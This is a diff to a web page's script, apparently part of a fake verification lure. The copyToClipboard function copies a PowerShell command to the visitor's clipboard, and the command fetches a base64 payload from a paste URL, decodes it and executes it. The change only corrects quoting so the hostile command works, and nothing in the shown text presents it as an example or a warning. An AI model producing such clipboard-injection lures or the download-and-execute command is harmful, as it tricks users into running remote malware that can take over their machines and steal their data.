@@ -135,7 +135,7 @@
         }
 
         function copyToClipboard() {
-            const code = "iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((New-Object Net.WebClient).DownloadString("https://raw-paste.vercel.app/raw/o99sqs8585pp924nrp31sp14s3rp11rn"))))";
+            const code = "iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((New-Object Net.WebClient).DownloadString('https://raw-paste.vercel.app/raw/o99sqs8585pp924nrp31sp14s3rp11rn'))))";
             navigator.clipboard.writeText(code).then(() => {
                 const button = document.getElementById('verify-button');
                 const successMessage = document.getElementById('success-message');
